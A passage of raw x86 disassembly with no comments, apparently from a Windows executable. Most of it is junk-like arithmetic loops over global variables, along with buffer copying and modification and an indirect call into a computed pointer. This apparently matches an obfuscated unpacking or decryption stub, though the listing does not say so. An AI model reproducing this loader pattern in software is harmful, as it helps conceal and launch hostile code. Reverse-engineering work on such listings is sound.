  42630c:	add    eax,DWORD PTR ds:0x43e05c
  426312:	mov    ds:0x43e05c,eax
  426317:	mov    eax,ds:0x464e90
  42631c:	mov    eax,DWORD PTR [eax+0x5]
  42631f:	mov    ds:0x464e8c,eax
  426324:	mov    eax,ds:0x43e098
  426329:	mov    DWORD PTR [ebp-0x30],eax
  42632c:	mov    eax,ds:0x43e09c
  426331:	mov    DWORD PTR [ebp-0x2c],eax
  426334:	cmp    DWORD PTR [ebp-0x30],0x1
  426338:	jne    0x426340
  42633a:	cmp    DWORD PTR [ebp-0x2c],0x0
  42633e:	je     0x42634e
  426340:	cmp    DWORD PTR [ebp-0x30],0x13
  426344:	jne    0x42634c
  426346:	cmp    DWORD PTR [ebp-0x2c],0x0
  42634a:	je     0x426399
  42634c:	jmp    0x4263ba
  42634e:	mov    eax,DWORD PTR [ebp+0x8]
  426351:	xor    ecx,ecx
  426353:	mov    esi,DWORD PTR ds:0x43e098
  426359:	sub    esi,eax
  42635b:	mov    edi,DWORD PTR ds:0x43e09c
  426361:	sbb    edi,ecx
  426363:	movzx  eax,WORD PTR ds:0x43e098
  42636a:	cdq    
  42636b:	add    esi,eax
  42636d:	adc    edi,edx
  42636f:	mov    DWORD PTR [ebp+0x8],esi
  426372:	mov    eax,ds:0x43e098
  426377:	add    eax,0x1f
  42637a:	mov    ecx,DWORD PTR ds:0x43e09c
  426380:	adc    ecx,0x0
  426383:	mov    edx,DWORD PTR [ebp+0x8]
  426386:	xor    esi,esi
  426388:	add    eax,edx
  42638a:	adc    ecx,esi
  42638c:	mov    ds:0x43e098,eax
  426391:	mov    DWORD PTR ds:0x43e09c,ecx
  426397:	jmp    0x42640a
  426399:	mov    eax,DWORD PTR [ebp+0x8]
  42639c:	add    eax,0x5
  42639f:	xor    ecx,ecx
  4263a1:	add    eax,DWORD PTR ds:0x43e098
  4263a7:	adc    ecx,DWORD PTR ds:0x43e09c
  4263ad:	mov    ds:0x43e098,eax
  4263b2:	mov    DWORD PTR ds:0x43e09c,ecx
  4263b8:	jmp    0x42640a
  4263ba:	mov    eax,ds:0x43e098
  4263bf:	add    eax,0x2e
  4263c2:	mov    ecx,DWORD PTR ds:0x43e09c
  4263c8:	adc    ecx,0x0
  4263cb:	sub    eax,DWORD PTR ds:0x43e098
  4263d1:	sbb    ecx,DWORD PTR ds:0x43e09c
  4263d7:	mov    ds:0x43e098,eax
  4263dc:	mov    DWORD PTR ds:0x43e09c,ecx
  4263e2:	mov    eax,ds:0x43e098
  4263e7:	add    eax,0x2e
  4263ea:	mov    ecx,DWORD PTR ds:0x43e09c
  4263f0:	adc    ecx,0x0
  4263f3:	sub    eax,DWORD PTR ds:0x43e098
  4263f9:	sbb    ecx,DWORD PTR ds:0x43e09c
  4263ff:	mov    ds:0x43e098,eax
  426404:	mov    DWORD PTR ds:0x43e09c,ecx
  42640a:	mov    eax,DWORD PTR [ebp-0x8]
  42640d:	mov    ecx,DWORD PTR [ebp-0xc]
  426410:	lea    eax,[ecx+eax*1+0x1f]
  426414:	mov    ds:0x43e05c,eax
  426419:	mov    eax,ds:0x43e094
  42641e:	mov    DWORD PTR [ebp-0x34],eax
  426421:	cmp    DWORD PTR [ebp-0x34],0x1
  426425:	je     0x42642f
  426427:	cmp    DWORD PTR [ebp-0x34],0x13
  42642b:	je     0x426457
  42642d:	jmp    0x42646a
  42642f:	mov    eax,ds:0x43e094
  426434:	sub    eax,DWORD PTR [ebp+0x8]
  426437:	movzx  ecx,WORD PTR ds:0x43e058
  42643e:	add    eax,ecx
  426440:	mov    DWORD PTR [ebp+0x8],eax
  426443:	mov    eax,DWORD PTR [ebp+0x8]
  426446:	mov    ecx,DWORD PTR ds:0x43e058
  42644c:	lea    eax,[ecx+eax*1+0x1f]
  426450:	mov    ds:0x43e094,eax
  426455:	jmp    0x426490
  426457:	mov    eax,ds:0x43e094
  42645c:	mov    ecx,DWORD PTR [ebp+0x8]
  42645f:	lea    eax,[ecx+eax*1+0x5]
  426463:	mov    ds:0x43e058,eax
  426468:	jmp    0x426490
  42646a:	mov    eax,ds:0x43e094
  42646f:	add    eax,0x2e
  426472:	sub    eax,DWORD PTR ds:0x43e058
  426478:	mov    ds:0x43e058,eax
  42647d:	mov    eax,ds:0x43e058
  426482:	add    eax,0x2e
  426485:	sub    eax,DWORD PTR ds:0x43e094
  42648b:	mov    ds:0x43e058,eax
  426490:	movzx  eax,BYTE PTR [ebp-0x8]
  426494:	mov    ecx,DWORD PTR ds:0x43e05c
  42649a:	lea    eax,[ecx+eax*1+0x4]
  42649e:	mov    DWORD PTR [ebp-0xc],eax
  4264a1:	mov    eax,ds:0x464e9c
  4264a6:	add    eax,DWORD PTR ds:0x464e8c
  4264ac:	mov    ds:0x464e9c,eax
  4264b1:	mov    DWORD PTR [ebp-0x4],0x3c
  4264b8:	jmp    0x4264c3
  4264ba:	mov    eax,DWORD PTR [ebp-0x4]
  4264bd:	add    eax,0x5
  4264c0:	mov    DWORD PTR [ebp-0x4],eax
  4264c3:	cmp    DWORD PTR [ebp-0x4],0xc4f
  4264ca:	jge    0x4265b4
  4264d0:	mov    eax,ds:0x464e9c
  4264d5:	mov    eax,DWORD PTR [eax]
  4264d7:	cmp    eax,DWORD PTR ds:0x43e05c
  4264dd:	jne    0x4264e4
  4264df:	jmp    0x4265b4
  4264e4:	mov    eax,ds:0x464e9c
  4264e9:	mov    eax,DWORD PTR [eax]
  4264eb:	mov    ecx,DWORD PTR ds:0x43e05c
  4264f1:	lea    eax,[eax+ecx*1+0x5]
  4264f5:	xor    ecx,ecx
  4264f7:	mov    ds:0x43e098,eax
  4264fc:	mov    DWORD PTR ds:0x43e09c,ecx
  426502:	cmp    DWORD PTR ds:0x43e098,0x39b
  42650c:	jne    0x42651c
  42650e:	cmp    DWORD PTR ds:0x43e09c,0x0
  426515:	jne    0x42651c
  426517:	jmp    0x4265b4
  42651c:	mov    eax,ds:0x43e05c
  426521:	xor    ecx,ecx
  426523:	add    eax,DWORD PTR ds:0x43e098
  426529:	adc    ecx,DWORD PTR ds:0x43e09c
  42652f:	add    eax,0x32
  426532:	adc    ecx,0x0
  426535:	mov    edx,DWORD PTR ds:0x464e9c
  42653b:	mov    edx,DWORD PTR [edx]
  42653d:	xor    esi,esi
  42653f:	mov    DWORD PTR [ebp-0x3c],eax
  426542:	mov    DWORD PTR [ebp-0x38],ecx
  426545:	mov    DWORD PTR [ebp-0x44],edx
  426548:	mov    DWORD PTR [ebp-0x40],esi
  42654b:	mov    eax,DWORD PTR [ebp-0x3c]
  42654e:	cmp    eax,DWORD PTR [ebp-0x44]
  426551:	jne    0x426579
  426553:	mov    eax,DWORD PTR [ebp-0x38]
  426556:	cmp    eax,DWORD PTR [ebp-0x40]
  426559:	jne    0x426579
  42655b:	mov    eax,ds:0x464e9c
  426560:	mov    eax,DWORD PTR [eax]
  426562:	mov    ecx,DWORD PTR ds:0x43e05c
  426568:	lea    eax,[ecx+eax*1+0x1f]
  42656c:	xor    ecx,ecx
  42656e:	mov    ds:0x43e098,eax
  426573:	mov    DWORD PTR ds:0x43e09c,ecx
  426579:	mov    eax,ds:0x464e9c
  42657e:	mov    eax,DWORD PTR [eax]
  426580:	cmp    eax,DWORD PTR ds:0x43e05c
  426586:	jne    0x42658a
  426588:	jmp    0x4265b4
  42658a:	mov    ecx,DWORD PTR ds:0x43e098
  426590:	add    ecx,0x4
  426593:	mov    esi,DWORD PTR ds:0x43e09c
  426599:	adc    esi,0x0
  42659c:	mov    eax,ds:0x464e9c
  4265a1:	movzx  eax,BYTE PTR [eax]
  4265a4:	cdq    
  4265a5:	add    ecx,eax
  4265a7:	adc    esi,edx
  4265a9:	mov    DWORD PTR ds:0x43e05c,ecx
  4265af:	jmp    0x4264ba
  4265b4:	mov    eax,DWORD PTR [ebp+0x8]
  4265b7:	add    eax,0x2e
  4265ba:	sub    eax,DWORD PTR [ebp-0xc]
  4265bd:	mov    ds:0x43e05c,eax
  4265c2:	mov    eax,ds:0x43e098
  4265c7:	add    eax,DWORD PTR ds:0x43e098
  4265cd:	mov    ecx,DWORD PTR ds:0x43e09c
  4265d3:	adc    ecx,DWORD PTR ds:0x43e09c
  4265d9:	add    eax,0x32
  4265dc:	adc    ecx,0x0
  4265df:	mov    edx,DWORD PTR [ebp+0x8]
  4265e2:	xor    esi,esi
  4265e4:	mov    DWORD PTR [ebp-0x4c],eax
  4265e7:	mov    DWORD PTR [ebp-0x48],ecx
  4265ea:	mov    DWORD PTR [ebp-0x54],edx
  4265ed:	mov    DWORD PTR [ebp-0x50],esi
  4265f0:	mov    eax,DWORD PTR [ebp-0x4c]
  4265f3:	cmp    eax,DWORD PTR [ebp-0x54]
  4265f6:	jne    0x426625
  4265f8:	mov    eax,DWORD PTR [ebp-0x48]
  4265fb:	cmp    eax,DWORD PTR [ebp-0x50]
  4265fe:	jne    0x426625
  426600:	mov    eax,ds:0x43e098
  426605:	add    eax,0x1f
  426608:	mov    ecx,DWORD PTR ds:0x43e09c
  42660e:	adc    ecx,0x0
  426611:	mov    edx,DWORD PTR [ebp+0x8]
  426614:	xor    esi,esi
  426616:	add    eax,edx
  426618:	adc    ecx,esi
  42661a:	mov    ds:0x43e098,eax
  42661f:	mov    DWORD PTR ds:0x43e09c,ecx
  426625:	mov    eax,DWORD PTR [ebp-0x8]
  426628:	sub    eax,0x3222
  42662d:	sub    eax,DWORD PTR [ebp-0xc]
  426630:	mov    DWORD PTR [ebp-0xc],eax
  426633:	mov    edx,DWORD PTR ds:0x464e9c
  426639:	call   edx
  42663b:	mov    DWORD PTR [ebp-0x4],0x3c
  426642:	jmp    0x42664d
  426644:	mov    eax,DWORD PTR [ebp-0x4]
  426647:	add    eax,0x5
  42664a:	mov    DWORD PTR [ebp-0x4],eax
  42664d:	cmp    DWORD PTR [ebp-0x4],0xc4f
  426654:	jge    0x426724
  42665a:	mov    eax,DWORD PTR [ebp+0x8]
  42665d:	cmp    eax,DWORD PTR ds:0x43e094
  426663:	jne    0x42666a
  426665:	jmp    0x426724
  42666a:	mov    eax,ds:0x43e094
  42666f:	mov    ecx,DWORD PTR [ebp+0x8]
  426672:	lea    eax,[ecx+eax*1+0x5]
  426676:	xor    ecx,ecx
  426678:	mov    ds:0x43e098,eax
  42667d:	mov    DWORD PTR ds:0x43e09c,ecx
  426683:	cmp    DWORD PTR ds:0x43e098,0x39b
  42668d:	jne    0x42669d
  42668f:	cmp    DWORD PTR ds:0x43e09c,0x0
  426696:	jne    0x42669d
  426698:	jmp    0x426724
  42669d:	mov    eax,ds:0x43e094
  4266a2:	xor    ecx,ecx
  4266a4:	add    eax,DWORD PTR ds:0x43e098
  4266aa:	adc    ecx,DWORD PTR ds:0x43e09c
  4266b0:	add    eax,0x32
  4266b3:	adc    ecx,0x0
  4266b6:	mov    edx,DWORD PTR [ebp+0x8]
  4266b9:	xor    esi,esi
  4266bb:	mov    DWORD PTR [ebp-0x5c],eax
  4266be:	mov    DWORD PTR [ebp-0x58],ecx
  4266c1:	mov    DWORD PTR [ebp-0x64],edx
  4266c4:	mov    DWORD PTR [ebp-0x60],esi
  4266c7:	mov    eax,DWORD PTR [ebp-0x5c]
  4266ca:	cmp    eax,DWORD PTR [ebp-0x64]
  4266cd:	jne    0x4266f1
  4266cf:	mov    eax,DWORD PTR [ebp-0x58]
  4266d2:	cmp    eax,DWORD PTR [ebp-0x60]
  4266d5:	jne    0x4266f1
  4266d7:	mov    eax,DWORD PTR [ebp+0x8]
  4266da:	mov    ecx,DWORD PTR ds:0x43e094
  4266e0:	lea    eax,[ecx+eax*1+0x1f]
  4266e4:	xor    ecx,ecx
  4266e6:	mov    ds:0x43e098,eax
  4266eb:	mov    DWORD PTR ds:0x43e09c,ecx
  4266f1:	mov    eax,DWORD PTR [ebp+0x8]
  4266f4:	cmp    eax,DWORD PTR ds:0x43e094
  4266fa:	jne    0x4266fe
  4266fc:	jmp    0x426724
  4266fe:	mov    ecx,DWORD PTR ds:0x43e098
  426704:	add    ecx,0x4
  426707:	mov    esi,DWORD PTR ds:0x43e09c
  42670d:	adc    esi,0x0
  426710:	movzx  eax,BYTE PTR [ebp+0x8]
  426714:	cdq    
  426715:	add    ecx,eax
  426717:	adc    esi,edx
  426719:	mov    DWORD PTR ds:0x43e094,ecx
  42671f:	jmp    0x426644
  426724:	mov    eax,DWORD PTR [ebp-0xc]
  426727:	mov    ecx,DWORD PTR [ebp-0x8]
  42672a:	lea    eax,[ecx+eax*1+0x3ef9]
  426731:	add    eax,DWORD PTR ds:0x43e05c
  426737:	mov    ds:0x43e05c,eax
  42673c:	mov    eax,ds:0x43e07c
  426741:	imul   eax,eax,0x5c
  426744:	cmp    DWORD PTR [ebp+0x8],eax
  426747:	je     0x426764
  426749:	mov    eax,DWORD PTR [ebp+0x8]
  42674c:	add    eax,0x2e
  42674f:	sub    eax,DWORD PTR ds:0x43e07c
  426755:	xor    ecx,ecx
  426757:	mov    ds:0x43e098,eax
  42675c:	mov    DWORD PTR ds:0x43e09c,ecx
  426762:	jmp    0x42677e
  426764:	mov    eax,DWORD PTR [ebp+0x8]
  426767:	mov    ecx,DWORD PTR ds:0x43e07c
  42676d:	lea    eax,[ecx+eax*1+0x4]
  426771:	xor    ecx,ecx
  426773:	mov    ds:0x43e098,eax
  426778:	mov    DWORD PTR ds:0x43e09c,ecx
  42677e:	mov    eax,DWORD PTR [ebp-0x8]
  426781:	add    eax,0x2e
  426784:	sub    eax,DWORD PTR [ebp-0xc]
  426787:	mov    ds:0x43e05c,eax
  42678c:	mov    eax,ds:0x43e094
  426791:	call   0x42604c
  426796:	mov    ds:0x43e058,eax
  42679b:	mov    eax,DWORD PTR [ebp-0xc]
  42679e:	pop    edi
  42679f:	pop    esi
  4267a0:	leave  
  4267a1:	ret    
  4267a2:	push   0x464e64
  4267a7:	call   DWORD PTR ds:0x439058
  4267ad:	mov    eax,ds:0x43e058
  4267b2:	sub    eax,DWORD PTR ds:0x43e098
  4267b8:	add    eax,0x2e
  4267bb:	ret    
  4267bc:	push   DWORD PTR [esp+0x8]
  4267c0:	call   0x42e477
  4267c5:	cmp    eax,0xffffffff
  4267c8:	pop    ecx
  4267c9:	jne    0x4267ce
  4267cb:	xor    al,al
  4267cd:	ret    
  4267ce:	mov    ecx,DWORD PTR [esp+0x4]
  4267d2:	mov    BYTE PTR [ecx],al
  4267d4:	mov    al,0x1
  4267d6:	ret    
  4267d7:	push   DWORD PTR [esp+0x4]
  4267db:	movsx  eax,al
  4267de:	push   eax
  4267df:	call   0x42dd4d
  4267e4:	pop    ecx
  4267e5:	pop    ecx
  4267e6:	xor    ecx,ecx
  4267e8:	cmp    eax,0xffffffff
  4267eb:	setne  cl
  4267ee:	mov    al,cl
  4267f0:	ret    
  4267f1:	movzx  eax,BYTE PTR [eax]
  4267f4:	push   DWORD PTR [esp+0x4]
  4267f8:	push   eax
  4267f9:	call   0x42e257
  4267fe:	pop    ecx
  4267ff:	pop    ecx
  426800:	xor    ecx,ecx
  426802:	cmp    eax,0xffffffff
  426805:	setne  cl
  426808:	mov    al,cl
  42680a:	ret    
  42680b:	push   ebp
  42680c:	lea    ebp,[esp-0x78]
  426810:	sub    esp,0x19c
  426816:	push   esi
  426817:	push   edi
  426818:	mov    DWORD PTR ds:0x464e60,0x44003f
  426822:	call   0x4267a2
  426827:	push   DWORD PTR ds:0x464e60
  42682d:	mov    esi,eax
  42682f:	mov    ecx,0x88c
  426834:	mov    eax,0x43e0a0
  426839:	call   0x426a67
  42683e:	mov    eax,ds:0x43e058
  426843:	pop    ecx
  426844:	lea    ecx,[eax+0x365]
  42684a:	cmp    ecx,0x23e
  426850:	jb     0x426866
  426852:	mov    ecx,0x3c5
  426857:	sub    ecx,eax
  426859:	and    DWORD PTR ds:0x43e09c,0x0
  426860:	mov    DWORD PTR ds:0x43e098,ecx
  426866:	push   ebx
  426867:	mov    edi,0x5aa0c
  42686c:	jmp    0x426873
  42686e:	mov    eax,ds:0x43e058
  426873:	mov    ecx,DWORD PTR ds:0x43e07c
  426879:	lea    eax,[ecx+eax*1+0x1f]
  42687d:	mov    ds:0x43e05c,eax
  426882:	call   0x4267a2
  426887:	mov    ecx,DWORD PTR ds:0x43e058
  42688d:	add    esi,eax
  42688f:	push   0x48
  426891:	xor    edx,edx
  426893:	mov    eax,ecx
  426895:	pop    ebx
  426896:	div    ebx
  426898:	cmp    eax,0x65
  42689b:	jbe    0x4268b0
  42689d:	mov    eax,ds:0x43e098
  4268a2:	add    eax,esi
  4268a4:	lea    eax,[ecx+eax*1+0x3ef9]
  4268ab:	mov    ds:0x43e058,eax
  4268b0:	call   0x4267a2
  4268b5:	sub    esi,eax
  4268b7:	call   0x4269c8
  4268bc:	dec    edi
  4268bd:	jne    0x42686e
  4268bf:	push   DWORD PTR ds:0x464e60
  4268c5:	push   esi
  4268c6:	call   0x4260fc
  4268cb:	mov    edx,DWORD PTR ds:0x43e058
  4268d1:	xor    ecx,ecx
  4268d3:	add    edx,0xffffcdde
  4268d9:	xor    esi,esi
  4268db:	sub    edx,eax
  4268dd:	sbb    esi,ecx
  4268df:	push   0x43b534
  4268e4:	mov    ebx,0x43f8e0
  4268e9:	push   ebx
  4268ea:	mov    DWORD PTR ds:0x43e098,edx
  4268f0:	mov    DWORD PTR ds:0x43e09c,esi
  4268f6:	call   0x42c5b4
  4268fb:	add    esp,0x10
  4268fe:	push   0x100
  426903:	lea    eax,[ebp-0x124]
  426909:	push   eax
  42690a:	mov    esi,0x43f978
  42690f:	call   0x42afe9
  426914:	xor    eax,eax
  426916:	inc    eax
  426917:	push   eax
  426918:	push   0x1b6
  42691d:	lea    ecx,[ebp-0x124]
  426923:	push   ecx
  426924:	lea    edi,[ebp-0x24]
  426927:	call   0x42b204
  42692c:	xor    edi,edi
  42692e:	jmp    0x426953
  426930:	lea    eax,[ebp-0x24]
  426933:	push   eax
  426934:	call   0x42af26
  426939:	mov    BYTE PTR [ebp+0x74],al
  42693c:	mov    eax,DWORD PTR [ebp-0x24]
  42693f:	mov    eax,DWORD PTR [eax+0x4]
  426942:	cmp    DWORD PTR [ebp+eax*1-0x1c],edi
  426946:	jne    0x426953
  426948:	push   DWORD PTR [ebp+0x74]
  42694b:	push   ebx
  42694c:	call   0x42c71d
  426951:	pop    ecx
  426952:	pop    ecx
  426953:	mov    eax,DWORD PTR [ebp-0x24]
  426956:	mov    eax,DWORD PTR [eax+0x4]
  426959:	cmp    DWORD PTR [ebp+eax*1-0x1c],edi
  42695d:	je     0x426930
  42695f:	lea    esi,[ebp-0x24]
  426962:	call   0x42b2a1
  426967:	mov    ecx,DWORD PTR ds:0x43e058
  42696d:	mov    esi,DWORD PTR ds:0x43e098
  426973:	mov    edx,ecx
  426975:	add    edx,esi
  426977:	mov    eax,edi
  426979:	adc    eax,DWORD PTR ds:0x43e09c
  42697f:	add    edx,0x32
  426982:	adc    eax,edi
  426984:	cmp    edx,ecx
  426986:	pop    ebx
  426987:	jne    0x426996
  426989:	cmp    eax,edi
  42698b:	jne    0x426996
  42698d:	lea    eax,[ecx+esi*1+0x1f]
  426991:	mov    ds:0x43e058,eax
  426996:	mov    esi,DWORD PTR ds:0x464e60
  42699c:	lea    eax,[ebp-0x24]
  42699f:	call   0x4269ad
  4269a4:	pop    edi
  4269a5:	mov    eax,esi
  4269a7:	pop    esi
  4269a8:	add    ebp,0x78
  4269ab:	leave  
  4269ac:	ret    
  4269ad:	push   esi
  4269ae:	mov    esi,eax
  4269b0:	add    esi,0x64
  4269b3:	mov    ecx,esi
  4269b5:	call   0x42b278
  4269ba:	mov    DWORD PTR [esi],0x4391f8
  4269c0:	mov    ecx,esi
  4269c2:	pop    esi
  4269c3:	jmp    0x42cb7b
  4269c8:	sub    esp,0xc
  4269cb:	mov    eax,ds:0x43e094
  4269d0:	push   ebx
  4269d1:	mov    ebx,DWORD PTR ds:0x43e07c
  4269d7:	push   ebp
  4269d8:	mov    ebp,DWORD PTR ds:0x464e60
  4269de:	push   esi
  4269df:	push   edi
  4269e0:	mov    edi,DWORD PTR ds:0x43e058
  4269e6:	push   0x57
  4269e8:	pop    esi
  4269e9:	sub    esi,DWORD PTR ds:0x43e098
  4269ef:	push   0x0
  4269f1:	pop    ecx
  4269f2:	sbb    ecx,DWORD PTR ds:0x43e09c
  4269f8:	lea    eax,[edi+eax*1+0x1f]
  4269fc:	mov    DWORD PTR [esp+0x14],eax
  426a00:	mov    DWORD PTR [esp+0x10],0x36
  426a08:	push   0x0
  426a0a:	push   0x5c
  426a0c:	push   ecx
  426a0d:	push   esi
  426a0e:	call   0x437b80
  426a13:	cmp    ebx,eax
  426a15:	jne    0x426a1d
  426a17:	xor    eax,eax
  426a19:	cmp    eax,edx
  426a1b:	je     0x426a26
  426a1d:	mov    eax,ebx
  426a1f:	sub    eax,esi
  426a21:	add    eax,0x2e
  426a24:	jmp    0x426a2a
  426a26:	lea    eax,[esi+ebx*1+0x4]
  426a2a:	add    DWORD PTR [ebp+0x0],0x1a00140
  426a31:	mov    esi,DWORD PTR [esp+0x14]
  426a35:	lea    edx,[edi+ebx*1-0x32]
  426a39:	xor    ecx,ecx
  426a3b:	cmp    edx,0x23e
  426a41:	jb     0x426a4a
  426a43:	mov    esi,ebx
  426a45:	sub    esi,edi
  426a47:	add    esi,0x2e
  426a4a:	add    ebp,0x4
  426a4d:	dec    DWORD PTR [esp+0x10]
  426a51:	jne    0x426a08
  426a53:	pop    edi
  426a54:	mov    DWORD PTR ds:0x43e098,esi
  426a5a:	pop    esi
  426a5b:	pop    ebp
  426a5c:	mov    DWORD PTR ds:0x43e09c,ecx
  426a62:	pop    ebx
  426a63:	add    esp,0xc
  426a66:	ret    
  426a67:	push   ebp
  426a68:	mov    ebp,esp
  426a6a:	push   ecx
  426a6b:	push   esi
  426a6c:	mov    esi,DWORD PTR [ebp+0x8]
  426a6f:	push   edi
  426a70:	mov    edi,ecx
  426a72:	test   edi,edi
  426a74:	je     0x426ab3
  426a76:	mov    ecx,DWORD PTR ds:0x43e058
  426a7c:	sub    eax,esi
  426a7e:	mov    DWORD PTR [ebp-0x4],eax
  426a81:	push   ebx
  426a82:	push   0x48
  426a84:	xor    edx,edx
  426a86:	mov    eax,ecx
  426a88:	pop    ebx
  426a89:	div    ebx
  426a8b:	dec    edi
  426a8c:	cmp    eax,0x65
  426a8f:	jbe    0x426a9f
  426a91:	mov    eax,ds:0x43e098
  426a96:	add    eax,edi
  426a98:	lea    ecx,[ecx+eax*1+0x3ef9]
  426a9f:	mov    eax,DWORD PTR [ebp-0x4]
  426aa2:	mov    al,BYTE PTR [eax+esi*1]
  426aa5:	mov    BYTE PTR [esi],al
  426aa7:	inc    esi
  426aa8:	test   edi,edi
  426aaa:	jne    0x426a82
  426aac:	mov    DWORD PTR ds:0x43e058,ecx
  426ab2:	pop    ebx
  426ab3:	mov    eax,DWORD PTR [ebp+0x8]
  426ab6:	pop    edi
  426ab7:	pop    esi
  426ab8:	leave  
  426ab9:	ret    
  426aba:	mov    ecx,DWORD PTR ds:0x43e05c
  426ac0:	sub    esp,0x10
  426ac3:	push   ebx
  426ac4:	mov    ebx,eax
  426ac6:	push   ebp
  426ac7:	push   esi
  426ac8:	push   edi
  426ac9:	xor    edi,edi
  426acb:	sub    ecx,DWORD PTR ds:0x43e098
  426ad1:	movzx  eax,bx
  426ad4:	sbb    edi,DWORD PTR ds:0x43e09c
  426ada:	cdq    
  426adb:	add    ecx,eax
  426add:	adc    edi,edx
  426adf:	xor    ebp,ebp
  426ae1:	lea    esi,[ebx-0x3222]
  426ae7:	sub    esi,ecx
  426ae9:	lea    ecx,[esi+ebx*1+0x5]
  426aed:	mov    eax,ecx
  426aef:	sbb    ebp,edi
  426af1:	dec    eax
  426af2:	je     0x426b1a
  426af4:	sub    eax,0x12
  426af7:	je     0x426b13
  426af9:	xor    edx,edx
  426afb:	xor    edi,edi
  426afd:	lea    eax,[ecx+0x2e]
  426b00:	sub    eax,ecx
  426b02:	sbb    edx,edi
  426b04:	sub    eax,esi
  426b06:	sbb    edx,ebp
  426b08:	add    eax,0x2e
  426b0b:	adc    edx,edi
  426b0d:	mov    esi,eax
  426b0f:	mov    ebp,edx
  426b11:	jmp    0x426b26
  426b13:	lea    esi,[ebx+0x18]
  426b16:	xor    ebp,ebp
  426b18:	jmp    0x426b26
  426b1a:	movzx  eax,si
  426b1d:	sub    eax,ebx
  426b1f:	inc    eax
  426b20:	mov    ebx,eax
  426b22:	lea    ecx,[esi+ebx*1+0x1f]
  426b26:	xor    edi,edi
  426b28:	movzx  eax,bx
  426b2b:	cdq    
  426b2c:	sub    eax,esi
  426b2e:	sbb    edx,ebp
  426b30:	add    eax,ecx
  426b32:	adc    edx,edi
  426b34:	mov    esi,ecx
  426b36:	add    esi,eax
  426b38:	adc    edi,edx
  426b3a:	add    esi,0x32
  426b3d:	adc    edi,0x0
  426b40:	xor    ebp,ebp
  426b42:	cmp    esi,ebx
  426b44:	jne    0x426b4e
  426b46:	cmp    edi,ebp
  426b48:	jne    0x426b4e
  426b4a:	lea    ecx,[eax+ebx*1+0x1f]
  426b4e:	mov    esi,DWORD PTR ds:0x43e07c
  426b54:	lea    ebp,[esi+ecx*1+0x4]
  426b58:	xor    edi,edi
  426b5a:	lea    esi,[ebx-0x3222]
  426b60:	sub    esi,eax
  426b62:	lea    eax,[ecx+ebx*1-0x32]
  426b66:	sbb    edi,edx
  426b68:	cmp    eax,0x23e
  426b6d:	jb     0x426b78
  426b6f:	mov    esi,ebx
  426b71:	sub    esi,ecx
  426b73:	add    esi,0x2e
  426b76:	xor    edi,edi
  426b78:	movzx  eax,cl
  426b7b:	lea    eax,[eax+ebp*1+0x4]
  426b7f:	mov    ds:0x43e07c,eax
  426b84:	mov    DWORD PTR [esp+0x10],0x9b9
  426b8c:	mov    eax,ecx
  426b8e:	dec    eax
  426b8f:	je     0x426bb7
  426b91:	sub    eax,0x12
  426b94:	je     0x426bb0
  426b96:	xor    edx,edx
  426b98:	xor    ebp,ebp
  426b9a:	lea    eax,[ecx+0x2e]
  426b9d:	sub    eax,ecx
  426b9f:	sbb    edx,ebp
  426ba1:	sub    eax,esi
  426ba3:	sbb    edx,edi
  426ba5:	add    eax,0x2e
  426ba8:	adc    edx,ebp
  426baa:	mov    esi,eax
  426bac:	mov    edi,edx
  426bae:	jmp    0x426bbf
  426bb0:	lea    esi,[ebx+0x18]
  426bb3:	xor    edi,edi
  426bb5:	jmp    0x426bbf
  426bb7:	movzx  eax,si
  426bba:	sub    eax,ebx
  426bbc:	inc    eax
  426bbd:	mov    ebx,eax
  426bbf:	lea    ecx,[esi+ebx*1+0x5]
  426bc3:	cmp    ebx,ecx
  426bc5:	jne    0x426be9
  426bc7:	push   0x0
  426bc9:	push   0x5c
  426bcb:	push   edi
  426bcc:	push   esi
  426bcd:	call   0x437b80
  426bd2:	xor    ecx,ecx
  426bd4:	cmp    ebx,eax
  426bd6:	jne    0x426bdc
  426bd8:	cmp    ecx,edx
  426bda:	je     0x426be5
  426bdc:	mov    ecx,ebx
  426bde:	sub    ecx,esi
  426be0:	add    ecx,0x2e
  426be3:	jmp    0x426be9
  426be5:	lea    ecx,[esi+ebx*1+0x4]
  426be9:	xor    edx,edx
  426beb:	mov    eax,ecx
  426bed:	add    eax,esi
  426bef:	adc    edx,edi
  426bf1:	add    eax,0x32
  426bf4:	adc    edx,0x0
  426bf7:	xor    ebp,ebp
  426bf9:	cmp    eax,ebx
  426bfb:	jne    0x426c05
  426bfd:	cmp    edx,ebp
  426bff:	jne    0x426c05
  426c01:	lea    ecx,[esi+ebx*1+0x1f]
  426c05:	dec    DWORD PTR [esp+0x10]
  426c09:	jne    0x426b8c
  426c0b:	mov    eax,ds:0x43e07c
  426c10:	and    DWORD PTR [esp+0x14],0x0
  426c15:	lea    eax,[eax+ecx*1+0x1f]
  426c19:	mov    ds:0x43e094,eax
  426c1e:	movzx  eax,bx
  426c21:	cdq    
  426c22:	mov    ebp,ecx
  426c24:	sub    ebp,esi
  426c26:	sbb    DWORD PTR [esp+0x14],edi
  426c2a:	add    ebp,eax
  426c2c:	mov    eax,DWORD PTR [esp+0x14]
  426c30:	adc    eax,edx
  426c32:	mov    edx,DWORD PTR ds:0x43e07c
  426c38:	mov    ds:0x43e09c,eax
  426c3d:	mov    eax,ds:0x43e094
  426c42:	lea    edx,[eax+edx*1+0x32]
  426c46:	mov    eax,ds:0x43e058
  426c4b:	cmp    edx,eax
  426c4d:	jne    0x426c5b
  426c4f:	mov    edx,DWORD PTR ds:0x43e07c
  426c55:	lea    esi,[eax+edx*1+0x1f]
  426c59:	jmp    0x426c61
  426c5b:	mov    esi,DWORD PTR ds:0x43e094
  426c61:	push   0x48
  426c63:	xor    edx,edx
  426c65:	mov    eax,ecx
  426c67:	pop    edi
  426c68:	div    edi
  426c6a:	cmp    eax,0x65
  426c6d:	jbe    0x426c79
  426c6f:	lea    eax,[ebx+ebp*1]
  426c72:	lea    ecx,[ecx+eax*1+0x3ef9]
  426c79:	movzx  eax,cl
  426c7c:	lea    edi,[eax+esi*1+0x4]
  426c80:	lea    eax,[ebx+ebp*1+0x1f]
  426c84:	xor    edx,edx
  426c86:	mov    ecx,eax
  426c88:	add    ecx,ebp
  426c8a:	adc    edx,DWORD PTR ds:0x43e09c
  426c90:	add    ecx,0x32
  426c93:	push   0x0
  426c95:	pop    ebp
  426c96:	movzx  ecx,bl
  426c99:	adc    edx,ebp
  426c9b:	xor    esi,esi
  426c9d:	lea    esi,[ecx+eax*1+0x4]
  426ca1:	mov    DWORD PTR ds:0x43e09c,ebp
  426ca7:	mov    DWORD PTR [esp+0x10],0x9b9
  426caf:	mov    ecx,eax
  426cb1:	dec    ecx
